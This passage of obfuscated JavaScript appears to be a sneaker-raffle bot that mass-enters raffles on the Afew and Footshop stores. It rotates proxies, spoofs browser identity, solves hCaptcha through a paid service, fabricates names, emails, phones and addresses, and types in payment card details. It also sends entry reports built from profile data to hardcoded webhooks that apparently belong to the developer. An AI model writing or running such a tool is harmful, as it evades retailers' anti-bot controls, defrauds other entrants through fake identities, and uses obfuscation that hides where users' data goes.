    _0x4123fe[0x0] == 'RANDOM' ? _0x4123fe[0x0] = '' + _0x4b7c93['first']() + _0x4b7c93['last']() + '@' : _0x4123fe[0x0] = _0x4123fe[0x0] + '@';
    _0x272869[_0x362071]['Email'] = _0x4123fe['join'](''), _0x272869[_0x362071]['Address1'] = _0x231bf4['join'](''), _0x272869[_0x362071]['Address2'] = _0x51dc01['join']('');
    _0x272869[_0x362071]['Phone'] == 'RANDOM' && (_0x272869[_0x362071]['Phone'] = '0' + _0x51920c(0x5f5e100, 0x3b9ac9ff));
    if (_0x272869[_0x362071]['Follower'] == 'RANDOM') {
        var _0x5ccef8 = _0x51920c(0x1, 0x270f);
        _0x272869[_0x362071]['Follower'] = '' + _0x4b7c93['first']() + _0x4b7c93['last']() + _0x5ccef8 + '\x20';
    }
    _0x272869[_0x362071]['HouseNumber'] == 'RANDOM' && (_0x272869[_0x362071]['HouseNumber'] = _0x51920c(0x1, 0xc8));
    if (_0x272869[_0x362071]['Address1'] == 'RANDOM') {
        var _0x2a3552 = Math['round'](Math['random']() * (_0x33f393['length'] - 0x1)), _0x1595aa = _0x1289d4[_0x2a3552];
        _0x272869[_0x362071]['Address1'] = _0x4b7c93['last']() + 'straat', _0x272869[_0x362071]['Zip'] == '' && (_0x272869[_0x362071]['Postcode'] = _0x51920c(0x3e8, 0x270f) + '\x20' + _0x1595aa + _0x1595aa, _0x272869[_0x362071]['Zip'] = _0x272869[_0x362071]['Postcode']), _0x272869[_0x362071]['HouseNumber'] = '' + _0x51920c(0x1, 0xc8);
    }
    return;
}
;
function _0x576c0b() {
    let _0x20650b = proxyFile['split']('\x0a'), _0x115486 = _0x20650b['map']((_0x2b9894, _0x43b5cb) => {
        sanatizeProxy = _0x2b9894['replace']('\x0d', '');
        if (_0x20650b[_0x43b5cb + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x115486;
}
;
async function _0x265970(_0x30979d) {
    var _0x3b42e5 = _0x30979d[0x1]['split'](':');
    const _0x166a47 = await _0x4146a9['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x3b42e5[0x0] + ':' + _0x3b42e5[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x5f5b22 = await _0x166a47['newPage']();
        await _0x5f5b22['authenticate']({
            'username': '' + _0x3b42e5[0x2],
            'password': '' + _0x3b42e5[0x3]
        }), console['log'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x5f5b22['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5f5b22['setRequestInterception'](!![]), _0x5f5b22['on']('request', _0x3efa6 => {
            _0x3efa6['resourceType']() === 'image' || _0x3efa6['resourceType']() === 'font' || _0x3efa6['resourceType']() === 'media' ? _0x3efa6['abort']() : _0x3efa6['continue']();
        }), await _0x5f5b22['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x5f5b22['waitForTimeout'](0xbb8), await _0x5f5b22['waitForSelector']('.product-card');
        const _0x4ac537 = await _0x5f5b22['$$eval']('a.product-card', _0x4c277e => {
            return _0x4c277e['map'](_0x2b9ccf => _0x2b9ccf['href']);
        });
        return _0x516ec2 = _0x4ac537;
    } catch (_0x859fce) {
        console['log']('\x20' + _0x859fce);
    } finally {
        _0x166a47['close'](), console['clear']();
    }
}
;
async function _0x457346(_0x263504, _0x55d4ef, _0x155fd2, _0x2f1a49, _0x19c737) {
    _0x55d4ef != 'ver' && await _0x10d7a7(_0x2f1a49, _0x263504);
    if (_0x32bec3['useRandomProxy'] = ![])
        var _0x1a32cb = _0x19c737[_0x263504]['split'](':');
    else
        var _0x4ce507 = Math['round'](Math['random']() * (_0x19c737['length'] - 0x1)), _0x1a32cb = _0x19c737[_0x4ce507]['split'](':');
    var _0x1e9411 = _0x155fd2['data'];
    _0x55d4ef != 'ver' && (_0x1e9411['data']['attributes']['properties']['$first_name'] = '' + _0x2f1a49[_0x263504]['FirstName'], _0x1e9411['data']['attributes']['properties']['$last_name'] = '' + _0x2f1a49[_0x263504]['LastName'], _0x1e9411['data']['attributes']['properties']['$address1'] = _0x2f1a49[_0x263504]['Address1'] + '\x20' + _0x2f1a49[_0x263504]['HouseNumber'] + '\x20' + _0x2f1a49[_0x263504]['Address2'], _0x1e9411['data']['attributes']['properties']['$zip'] = '' + _0x2f1a49[_0x263504]['Zip'], _0x1e9411['data']['attributes']['properties']['$city'] = '' + _0x2f1a49[_0x263504]['City'], _0x1e9411['data']['attributes']['properties']['$country'] = '' + _0x2f1a49[_0x263504]['Country'], _0x1e9411['data']['attributes']['properties']['Size'] = '' + _0x2f1a49[_0x263504]['Size'], _0x1e9411['data']['attributes']['properties']['Instagram\x20Handle'] = '' + _0x2f1a49[_0x263504]['Follower'], _0x55d4ef == 'exp' ? _0x1e9411['data']['attributes']['email'] = '' + _0x2f1a49[_0x263504]['FirstName'] + _0x2f1a49[_0x263504]['LastName'] + _0x32bec3['catchall'] : _0x1e9411['data']['attributes']['email'] = '' + _0x2f1a49[_0x263504]['Email']);
    var _0x482439 = {
        'jar': _0x5d7c39,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x155fd2['url'],
        'headers': _0x155fd2['headers'],
        'body': JSON['stringify'](_0x1e9411),
        'proxy': 'http://' + _0x1a32cb[0x2] + ':' + _0x1a32cb[0x3] + '@' + _0x1a32cb[0x0] + ':' + _0x1a32cb[0x1]
    };
    return _0x55d4ef === 'ver' && (_0x482439['method'] = 'GET'), new Promise(function (_0x47cba8, _0x4c1f44) {
        callback = async (_0x4f6c29, _0x40e41b, _0x4eeabf) => {
            if (!_0x4f6c29 && _0x40e41b['statusCode'] == 0xca || !_0x4f6c29 && _0x40e41b['statusCode'] == 0xc8) {
                _0x47cba8(console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x155fd2['name'] + ']\x20Task\x20' + (_0x263504 + 0x1) + ':\x20Raffle\x20Entered!')));
                if (_0x55d4ef != 'ver') {
                    var _0x391e8b = await _0x12f7f(_0x2f1a49[_0x263504], _0x155fd2, 'dev', ![]), _0x5a0036 = await _0x12f7f(_0x2f1a49[_0x263504], _0x155fd2, 'pub', ![]);
                    const _0xfd2d05 = {
                        'succesDEVMSG': { 'embeds': [_0x391e8b] },
                        'succesPUBMSG': { 'embeds': [_0x5a0036] }
                    };
                    if (_0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '')
                        try {
                            await _0x32e91d(_0x32bec3['webhook'], _0xfd2d05['succesDEVMSG']);
                        } catch {
                        }
                    await _0x45ce86(0xc8), await _0x32e91d(_0x1e4a2b, _0xfd2d05['succesDEVMSG']), await _0x45ce86(0xc8);
                    try {
                        await _0x32e91d(_0x1fcd8b, _0xfd2d05['succesPUBMSG']);
                    } catch {
                    }
                } else {
                    if (_0x55d4ef == 'ver') {
                        var _0x391e8b = await _0x12f7f(null, _0x155fd2, 'ver', ![]);
                        const _0x5e3332 = {
                            'succesDEVMSG': { 'embeds': [_0x391e8b] },
                            'succesPUBMSG': { 'embeds': [_0x5a0036] }
                        };
                        await _0x32e91d(_0x504cbb, _0x5e3332['succesDEVMSG']);
                    }
                }
            } else {
                if (_0x55d4ef != 'ver') {
                    var _0x3ed262 = '' + _0x4f6c29, _0x248a7d = await _0x12f7f(_0x2f1a49[_0x263504], _0x155fd2, 'dev', !![], _0x3ed262), _0x5ea245 = {};
                    _0x5ea245['errorDEV'] = { 'embeds': [_0x248a7d] }, _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0x5ea245['errorDEV']), await _0x32e91d(_0x49aba5, _0x5ea245['errorDEV']);
                }
                _0x4c1f44(console['log'](_0x3b5d06() + '\x20[' + _0x155fd2['name'] + ']\x20Task\x20' + (_0x263504 + 0x1) + ':\x20' + _0x4f6c29));
            }
        };
        try {
            _0x55d4ef === 'ver' ? console['log'](_0x3b5d06() + '\x20[' + _0x155fd2['name'] + ']\x20Task\x20' + (_0x263504 + 0x1) + ':\x20Verifying.') : console['log'](_0x3b5d06() + '\x20[' + _0x155fd2['name'] + ']\x20Task\x20' + (_0x263504 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1e9411['data']['attributes']['email']), _0x2b8b28(_0x482439, callback);
        } catch (_0x1f05bb) {
            console['log'](_0x3b5d06() + '\x20Task\x20' + (_0x263504 + 0x1) + ':\x20' + _0x1f05bb);
        }
    });
}
;
async function _0x2858eb(_0xeb4743, _0x168e53, _0x1ac93d) {
    _0x4146a9['use'](_0xc40ee6()), _0x4146a9['use'](_0x47d0c5({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x32bec3['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2e3e07 = 0x0; _0x2e3e07 < _0xeb4743['length']; _0x2e3e07++) {
        var _0x1287d3, _0xd97d59 = '', _0x47e5da = 0x0, _0xeec830 = [{
            'type': 'rich',
            'title': 'Succesful\x20Footshop\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x5ce999
                },
                {
                    'name': 'Product',
                    'value': '' + _0xeb4743[_0x2e3e07]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0xeb4743[_0x2e3e07]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x32bec3['footshopDelay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x37a22d
                }
            ]
        }], _0x983206 = await _0x12f7f(_0xeb4743[_0x2e3e07], _0x1ac93d, 'dev', ![]), _0x2fa208 = await _0x12f7f(_0xeb4743[_0x2e3e07], _0x1ac93d, 'pub', ![]);
        const _0x179fbe = {
            'succesDEVMSG': { 'embeds': [_0x983206] },
            'succesPUBMSG': { 'embeds': [_0x2fa208] }
        }, _0x350df1 = { 'embeds': _0xeec830 };
        await _0x10d7a7(_0xeb4743, _0x2e3e07);
        if (_0xeb4743[_0x2e3e07]['Email'] == '' || _0xeb4743[_0x2e3e07]['FirstName'] == '' || _0xeb4743[_0x2e3e07]['LastName'] == '' || _0xeb4743[_0x2e3e07]['Country'] == '' || _0xeb4743[_0x2e3e07]['Size'] == '' || _0xeb4743[_0x2e3e07]['Address1'] == '' || _0xeb4743[_0x2e3e07]['Zip'] == '') {
            console['log'](_0x3b5d06() + '\x20[' + _0x1ac93d['name'] + ']\x20Task\x20' + (_0x2e3e07 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xeb4743[_0x2e3e07]['Email'] == '' || _0xeb4743[_0x2e3e07]['FirstName'] == '' || _0xeb4743[_0x2e3e07]['LastName'] == '' || _0xeb4743[_0x2e3e07]['Country'] == '' || _0xeb4743[_0x2e3e07]['Size'] == '' || _0xeb4743[_0x2e3e07]['Address1'] == '' || _0xeb4743[_0x2e3e07]['Zip'] == '' || _0xeb4743[_0x2e3e07]['Phone'] == '') {
            console['log'](_0x3b5d06() + '\x20[' + _0x1ac93d['name'] + ']\x20Task\x20' + (_0x2e3e07 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        const _0xc2560e = '' + _0xeb4743[_0x2e3e07]['Url'];
        if (_0x32bec3['useRandomProxy'] = ![])
            var _0x4f08a4 = _0x168e53[_0x2e3e07]['split'](':');
        else
            var _0x4e866d = Math['round'](Math['random']() * (_0x168e53['length'] - 0x1)), _0x4f08a4 = _0x168e53[_0x4e866d]['split'](':');
        const _0xf8d62a = await _0x4146a9['launch']({
            'headless': !![],
            'args': ['--proxy-server=' + _0x4f08a4[0x0] + ':' + _0x4f08a4[0x1]]
        });
        try {
            const _0x286a9a = await _0xf8d62a['newPage']();
            await _0x286a9a['authenticate']({
                'username': '' + _0x4f08a4[0x2],
                'password': '' + _0x4f08a4[0x3]
            }), console['log'](_0x3b5d06() + '\x20[' + _0x1ac93d['name'] + ']\x20Task\x20' + (_0x2e3e07 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x286a9a['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x286a9a['setRequestInterception'](!![]), _0x286a9a['on']('request', _0x1272a5 => {
                _0x1272a5['resourceType']() === 'image' || _0x1272a5['resourceType']() === 'font' || _0x1272a5['resourceType']() === 'media' ? _0x1272a5['abort']() : _0x1272a5['continue']();
            }), await _0x286a9a['goto'](_0xc2560e), await _0x45ce86(0xbb8), await _0x286a9a['waitForSelector']('.control__JhutY'), await _0x286a9a['click']('.control__JhutY'), await _0x45ce86(0x1f4);
            if (_0xeb4743[_0x2e3e07]['Size'] != 'RANDOM')
                try {
                    const _0x29cfc2 = await _0x286a9a['$x']('//div[contains(text(),\x20\x27' + _0xeb4743[_0x2e3e07]['Size'] + '\x27)]');
                    await _0x29cfc2[0x0]['click']();
                } catch {
                    console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x1ac93d['name'] + ']\x20Task\x20' + (_0x2e3e07 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                    continue;
                }
            else {
                const _0x166fbd = await _0x286a9a['$$']('.options__3UQpT\x20>\x20div.row');
                var _0x47f95f = Math['round'](Math['random']() * (_0x166fbd['length'] - 0x1));
                await _0x166fbd[_0x47f95f]['click']();
            }
            await _0x45ce86(0x4b0);
            const _0x5ac758 = await _0x286a9a['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
            await _0x5ac758[0x0]['click'](), await _0x286a9a['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x3b5d06() + '\x20[' + _0x1ac93d['name'] + ']\x20Task\x20' + (_0x2e3e07 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x286a9a['type']('input[name=\x22email\x22]', '' + _0xeb4743[_0x2e3e07]['Email']), await _0x45ce86(0x640), await _0x286a9a['type']('input[name=\x22phone\x22]', '' + _0xeb4743[_0x2e3e07]['Phone']), await _0x45ce86(0x4b0), await _0x286a9a['click']('button.btn.continue-button__1RtsS'), await _0x45ce86(0x4b0);
            try {
                await _0x286a9a['type']('input[name=\x22firstName\x22]', '' + _0xeb4743[_0x2e3e07]['FirstName']), await _0x45ce86(0x258);
            } catch {
                const _0x493735 = await _0x286a9a['$$eval']('.invalid-feedback\x20>\x20div', _0x13f751 => {
                    return _0x13f751['map'](_0xc60522 => _0xc60522['innerText']);
                });
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x1ac93d['name'] + ']\x20Task\x20' + (_0x2e3e07 + 0x1) + '\x20:\x20' + _0x493735));
                continue;
            }
            await _0x286a9a['type']('input[name=\x22lastName\x22]', '' + _0xeb4743[_0x2e3e07]['LastName']), await _0x45ce86(0xc8), await _0x286a9a['type']('input[name=\x22instagramUsername\x22]', '' + _0xeb4743[_0x2e3e07]['Follower']), await _0x45ce86(0x4b0), await _0x286a9a['click']('button.btn.continue-button__1RtsS'), await _0x45ce86(0x3e8), console['log'](_0x3b5d06() + '\x20[' + _0x1ac93d['name'] + ']\x20Task\x20' + (_0x2e3e07 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x286a9a['select']('select[name=\x22country\x22]', '' + _0xeb4743[_0x2e3e07]['Country']), await _0x45ce86(0x2bc), await _0x286a9a['type']('input[name=\x22streetName\x22]', '' + _0xeb4743[_0x2e3e07]['Address1']), await _0x45ce86(0x258), await _0x286a9a['type']('input[name=\x22houseNumber\x22]', _0xeb4743[_0x2e3e07]['HouseNumber'] + '\x20' + _0xeb4743[_0x2e3e07]['Address2']), await _0x45ce86(0xc8), await _0x286a9a['type']('input[name=\x22postalCode\x22]', '' + _0xeb4743[_0x2e3e07]['Zip']), await _0x45ce86(0x1f4), await _0x286a9a['type']('input[name=\x22city\x22]', '' + _0xeb4743[_0x2e3e07]['City']), await _0x45ce86(0x4b0), await _0x286a9a['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x45ce86(0x4b0), await _0x286a9a['click']('button.btn.continue-button__1RtsS'), await _0x45ce86(0x4b0), console['log'](_0x3b5d06() + '\x20[' + _0x1ac93d['name'] + ']\x20Task\x20' + (_0x2e3e07 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x286a9a['solveRecaptchas'](), console['log'](_0x3b5d06() + '\x20[' + _0x1ac93d['name'] + ']\x20Task\x20' + (_0x2e3e07 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x45ce86(0xbb8), await _0x286a9a['click']('button.btn.continue-button__1RtsS'), await _0x45ce86(0x1388), console['log'](_0x3b5d06() + '\x20[' + _0x1ac93d['name'] + ']\x20Task\x20' + (_0x2e3e07 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x286a9a['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x286a9a['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x45ce86(0x4b0), await _0x286a9a['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0xeb4743[_0x2e3e07]['CardNumber']), await _0x45ce86(0x320), await _0x286a9a['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x286a9a['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0xeb4743[_0x2e3e07]['ExpiryDate']), await _0x45ce86(0x4b0), await _0x286a9a['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x286a9a['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0xeb4743[_0x2e3e07]['CVV']), await _0x45ce86(0x226), await _0x286a9a['type']('input[name=\x22holderName\x22]', '' + _0xeb4743[_0x2e3e07]['NameOnCard']), await _0x45ce86(0x226), await _0x286a9a['click']('button.adyen-checkout__button'), console['log'](_0x3b5d06() + '\x20[' + _0x1ac93d['name'] + ']\x20Task\x20' + (_0x2e3e07 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x286a9a['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x45ce86(0xbb8);
            } catch (_0x4e2adf) {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x1ac93d['name'] + ']\x20Task\x20' + (_0x2e3e07 + 0x1) + '\x20:\x203DS\x20Failed')), _0x1287d3 = '3DS\x20Error\x20' + _0x4e2adf;
                var _0x374d26 = await _0x12f7f(_0xeb4743[_0x2e3e07], _0x1ac93d, 'dev', !![], _0x1287d3);
                _0x179fbe['errorDEV'] = { 'embeds': [_0x374d26] };
                _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0x179fbe['errorDEV']);
                await _0x32e91d(_0x49aba5, _0x179fbe['errorDEV']);
                continue;
            }
            console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x1ac93d['name'] + ']\x20Task\x20' + (_0x2e3e07 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            if (_0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '')
                try {
                    await _0x32e91d(_0x32bec3['webhook'], _0x179fbe['succesDEVMSG']);
                } catch {
                }
            await _0x45ce86(0xc8), await _0x32e91d(_0x1e4a2b, _0x179fbe['succesDEVMSG']), await _0x45ce86(0xc8);
            try {
                await _0x32e91d(_0x1fcd8b, _0x179fbe['succesPUBMSG']);
            } catch {
            }
        } catch (_0x407607) {
            console['log'](_0x3b5d06() + '\x20[' + _0x1ac93d['name'] + ']\x20Task\x20' + (_0x2e3e07 + 0x1) + '\x20:\x20' + _0x407607), _0x1287d3 = '' + _0x407607;
            var _0x374d26 = await _0x12f7f(_0xeb4743[_0x2e3e07], _0x1ac93d, 'dev', !![], _0x1287d3);
            _0x179fbe['errorDEV'] = { 'embeds': [_0x374d26] }, _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0x179fbe['errorDEV']), await _0x32e91d(_0x49aba5, _0x179fbe['errorDEV']), _0xd97d59 = 'yes';
        } finally {
            _0xf8d62a['close']();
            if (_0xd97d59 == 'yes' && _0x47e5da != 0x5) {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x1ac93d['name'] + ']\x20Task\x20' + (_0x2e3e07 + 0x1) + '\x20:\x20Retrying')), _0x2e3e07 = _0x2e3e07 - 0x1, _0x47e5da = _0x47e5da + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x32bec3['footshopDelay'] + '\x20ms'), await _0x45ce86(_0x32bec3['footshopDelay']);
        }
    }
}
afewFunction = async (_0x1d5195, _0xce1514, _0x549a12, _0x2509ce, _0x107257) => {
    for (var _0x2f79b2 = 0x0; _0x2f79b2 < _0x2509ce['length']; _0x2f79b2++) {
        _0x32bec3['AfewDelay'] = _0x32bec3['delay'];
        var _0x3bd7fb, _0x334f7c = '', _0x48f0fb = 0x0;
        _0x2509ce[_0x2f79b2]['Url'] = _0x1d5195, _0x42c473(_0x549a12['name'] + '\x20Task\x20' + (_0x2f79b2 + 0x1) + '\x20/\x20' + _0x2509ce['length'] + '\x20||\x20File:\x20' + _0x28b8bc + '\x20Proxies:\x20' + _0x26a868), await _0x10d7a7(_0x2509ce, _0x2f79b2);
        var _0x22a5b1 = await _0x12f7f(_0x2509ce[_0x2f79b2], _0x549a12, 'dev', ![]), _0x2089f0 = await _0x12f7f(_0x2509ce[_0x2f79b2], _0x549a12, 'pub', ![]);
        const _0x457844 = {
            'succesDEVMSG': { 'embeds': [_0x22a5b1] },
            'succesPUBMSG': { 'embeds': [_0x2089f0] }
        };
        if (_0x2509ce[_0x2f79b2]['Email'] == '' || _0x2509ce[_0x2f79b2]['FirstName'] == '' || _0x2509ce[_0x2f79b2]['LastName'] == '' || _0x2509ce[_0x2f79b2]['Country'] == '' || _0x2509ce[_0x2f79b2]['Size'] == '' || _0x2509ce[_0x2f79b2]['Address1'] == '' || _0x2509ce[_0x2f79b2]['Zip'] == '') {
            console['log'](_0x3b5d06() + '\x20[' + _0x549a12['name'] + ']\x20Task\x20' + (_0x2f79b2 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x32bec3['useRandomProxy'] = ![])
            var _0x49ee7f = _0x107257[_0x2f79b2]['split'](':');
        else
            var _0x4852ef = Math['round'](Math['random']() * (_0x107257['length'] - 0x1)), _0x49ee7f = _0x107257[_0x4852ef]['split'](':');
        const _0x58bf9a = await _0x4146a9['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x49ee7f[0x0] + ':' + _0x49ee7f[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x55cb8f = await _0x58bf9a['newPage']();
            await _0x55cb8f['setDefaultNavigationTimeout'](0x1d4c0), await _0x55cb8f['authenticate']({
                'username': '' + _0x49ee7f[0x2],
                'password': '' + _0x49ee7f[0x3]
            }), console['log'](_0x3b5d06() + '\x20[' + _0x549a12['name'] + ']\x20Task\x20' + (_0x2f79b2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x55cb8f['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x55cb8f['setRequestInterception'](!![]), _0x55cb8f['on']('request', _0x1c83ae => {
                _0x1c83ae['resourceType']() === 'image' || _0x1c83ae['resourceType']() === 'font' || _0x1c83ae['resourceType']() === 'media' ? _0x1c83ae['abort']() : _0x1c83ae['continue']();
            }), await _0x55cb8f['goto'](_0x1d5195, { 'waitUntil': 'networkidle2' }), console['log'](_0x3b5d06() + '\x20[' + _0x549a12['name'] + ']\x20Task\x20' + (_0x2f79b2 + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x55cb8f['waitForTimeout'](0xfa0), console['log'](_0x3b5d06() + '\x20[' + _0x549a12['name'] + ']\x20Task\x20' + (_0x2f79b2 + 0x1) + '\x20:\x20Cookies\x20received'), await _0x55cb8f['waitForTimeout'](0x320);
            if (_0x2509ce[_0x2f79b2]['Size'] == 'RANDOM') {
                console['log'](_0x3b5d06() + '\x20[' + _0x549a12['name'] + ']\x20Task\x20' + (_0x2f79b2 + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                const _0x113b4e = await _0x55cb8f['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x1b28c5 => {
                    return _0x1b28c5['map'](_0x5da1d8 => _0x5da1d8['href']);
                });
                var _0x476b6d = Math['round'](Math['random']() * (_0x113b4e['length'] - 0x1));
                await _0x55cb8f['goto']('' + _0x113b4e[_0x476b6d]);
            } else {
                console['log'](_0x3b5d06() + '\x20[' + _0x549a12['name'] + ']\x20Task\x20' + (_0x2f79b2 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x2509ce[_0x2f79b2]['Size']);
                try {
                    const _0x344d77 = await _0x55cb8f['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x2509ce[_0x2f79b2]['Size'] + '\x22]\x20>\x20a', _0x165d75 => {
                        return _0x165d75['map'](_0x38f5e9 => _0x38f5e9['href']);
                    });
                    await _0x55cb8f['goto']('' + _0x344d77[0x0], { 'waitUntil': 'networkidle2' });
                } catch (_0xca4314) {
                    console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x549a12['name'] + ']\x20Task\x20' + (_0x2f79b2 + 0x1) + '\x20:\x20' + _0xca4314 + '\x20Size\x20not\x20found')), _0x3bd7fb = 'Size\x20Not\x20Found';
                    var _0x10c0e1 = await _0x12f7f(_0x2509ce[_0x2f79b2], _0x549a12, 'dev', !![], _0x3bd7fb);
                    _0x457844['errorDEV'] = { 'embeds': [_0x10c0e1] };
                    _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0x457844['errorDEV']);
                    await _0x32e91d(_0x49aba5, _0x457844['errorDEV']);
                    continue;
                }
            }
            await _0x55cb8f['waitForTimeout'](0x258), await _0x55cb8f['type']('#raffle-instagram', '' + _0x2509ce[_0x2f79b2]['Follower'], { 'delay': 0x64 }), await _0x55cb8f['waitForTimeout'](0x384), await _0x55cb8f['click']('#raffle-terms'), await _0x55cb8f['waitForTimeout'](0x384), await _0x55cb8f['evaluate'](() => {
                const _0x529f75 = document['querySelector']('button.btn[name=\x27add\x27]');
                _0x529f75['click']();
            }), await _0x55cb8f['waitForTimeout'](0xbb8), await _0x55cb8f['waitForSelector']('#checkout_email'), await _0x45ce86(0x3e8), console['log'](_0x3b5d06() + '\x20[' + _0x549a12['name'] + ']\x20Task\x20' + (_0x2f79b2 + 0x1) + '\x20:\x20Filling\x20Information');
            _0xce1514 == 'sec' ? await _0x55cb8f['type']('#checkout_email', '' + _0x2509ce[_0x2f79b2]['FirstName'] + _0x2509ce[_0x2f79b2]['LastName'] + _0x32bec3['catchall'], 0x32) : await _0x55cb8f['type']('#checkout_email', '' + _0x2509ce[_0x2f79b2]['Email'], 0x32);
            await _0x45ce86(0x320), await _0x55cb8f['select']('#checkout_shipping_address_country', '' + _0x2509ce[_0x2f79b2]['Country']), await _0x55cb8f['waitForTimeout'](0x258), await _0x55cb8f['type']('#checkout_shipping_address_first_name', '' + _0x2509ce[_0x2f79b2]['FirstName']), await _0x55cb8f['waitForTimeout'](0x320), await _0x55cb8f['type']('#checkout_shipping_address_last_name', '' + _0x2509ce[_0x2f79b2]['LastName']), await _0x55cb8f['waitForTimeout'](0x2bc), await _0x55cb8f['type']('#checkout_shipping_address_address1', _0x2509ce[_0x2f79b2]['Address1'] + '\x20' + _0x2509ce[_0x2f79b2]['HouseNumber']), await _0x55cb8f['waitForTimeout'](0x2bc), await _0x55cb8f['type']('#checkout_shipping_address_address2', '' + _0x2509ce[_0x2f79b2]['Address2']), await _0x55cb8f['waitForTimeout'](0x2bc);
            _0x2509ce[_0x2f79b2]['Postcode'] == undefined ? await _0x55cb8f['type']('#checkout_shipping_address_zip', '' + _0x2509ce[_0x2f79b2]['Zip']) : await _0x55cb8f['type']('#checkout_shipping_address_zip', '' + _0x2509ce[_0x2f79b2]['Postcode']);
            await _0x55cb8f['waitForTimeout'](0x2bc), await _0x55cb8f['type']('#checkout_shipping_address_city', '' + _0x2509ce[_0x2f79b2]['City']), await _0x55cb8f['waitForTimeout'](0x2bc), console['log'](_0x3b5d06() + '\x20[' + _0x549a12['name'] + ']\x20Task\x20' + (_0x2f79b2 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x55cb8f, _0x55cb8f['evaluate'](() => {
                const _0x15286c = document['querySelector']('#continue_button');
                for (var _0x1f56f6 = 0x0; _0x1f56f6 < 0x5; _0x1f56f6++) {
                    if (_0x15286c) {
                        _0x15286c['click'](), _0x15286c['click']();
                        break;
                    } else
                        _0x45ce86(0xfa0);
                }
            }), await _0x55cb8f['waitForTimeout'](0x1194);
            try {
                await _0x55cb8f['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
            } catch {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x549a12['name'] + ']\x20Task\x20' + (_0x2f79b2 + 0x1) + '\x20:\x20Proxy\x20Error'));
                continue;
            }
